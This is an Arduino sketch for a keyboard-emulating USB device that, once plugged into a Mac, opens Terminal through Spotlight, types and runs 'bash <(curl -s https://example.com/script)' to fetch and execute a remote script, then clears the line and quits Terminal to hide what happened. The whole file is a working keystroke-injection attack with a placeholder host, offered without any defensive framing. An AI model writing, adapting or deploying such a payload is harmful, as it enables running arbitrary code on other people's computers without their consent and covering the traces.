#include "Arduino.h"
#include <Keyboard.h>

void setup()
{
  Keyboard.begin();
  // 2 Second Delay before the point of no return
  delay(2000);
  // Command + Space
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write(' ');
  Keyboard.release(KEY_LEFT_GUI);
  delay(100);
  Keyboard.print("terminal");
  delay(100);
  // Press Enter
  Keyboard.print('\n');
  delay(100);
  // Clear any previous command line entry
  Keyboard.press(128);
  Keyboard.write('c');
  Keyboard.release(128);
  delay(100);
  // Fun
  Keyboard.print("bash <(curl -s https://example.com/script)");
  delay(200);
  Keyboard.print('\n');
  delay(100);
  // Clean up
  Keyboard.press(128);
  Keyboard.write('c');
  Keyboard.release(128);
  delay(100);
  // And quit
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('q');
  Keyboard.release(KEY_LEFT_GUI);
  delay(100);
}

void loop() { }
